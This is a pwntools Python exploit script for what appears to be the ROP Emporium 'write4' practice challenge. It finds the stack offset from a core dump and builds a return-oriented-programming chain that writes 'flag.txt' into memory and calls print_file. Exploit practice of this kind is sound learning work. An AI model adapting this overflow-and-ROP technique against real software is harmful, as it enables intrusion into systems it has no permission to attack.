#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./write4')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

libwrite4_addr = 0x7ff6ae000000
pwnme_addr = libwrite4_addr + 0x8aa
print_file_addr = libwrite4_addr + 0x943

gdbscript = '''
break *{a}
continue
'''.format(**locals(), a=elf.plt.pwnme)

context.terminal = ["tilix", "-a", "session-add-right", "-e"]
context.log_level = 'debug'
context.delete_corefiles = True

# -- Exploit goes here --

io = process([elf.path])
payload = cyclic(100)
io.sendlineafter('>', payload)
io.wait()

core = io.corefile
stack = core.rsp
print(f'stack address = {stack}')

rip_offset = cyclic_find(core.read(stack, 4))
print(f'rip offset = {rip_offset}')

io = start()

filename_addr = 0x601000 + 0x200

# awesome madafaking gadgets
pop_rsp_rx_ret = p64(0x000000000040068d)
pop_rdi_ret = p64(0x0000000000400693)
ret = p64(0x0000000000400693 + 1)
pop_rsi_r15_ret = p64(0x0000000000400691)
mov_r14_r15_ret = p64(0x400628)
pop_r14_r15_ret = p64(0x0000000000400690)

# payload to write 8byte data at arbitrary address
payload = flat(
    asm('nop') * rip_offset, # send offset data
    pop_r14_r15_ret, # r14 will store address to write to and r15 will store data
    p64(filename_addr), # address to write 8 byte data to (r14)
    b'flag.txt', # data to write (r15)
    mov_r14_r15_ret, # move data in r15 to address stored in r14
    pop_rdi_ret, # store address of data in rdi (first param of print_file)
    p64(filename_addr), # address of data
    p64(elf.sym.usefulFunction + 9) # call to print_file with address of filename
)

io.sendlineafter('>', payload)

io.interactive()
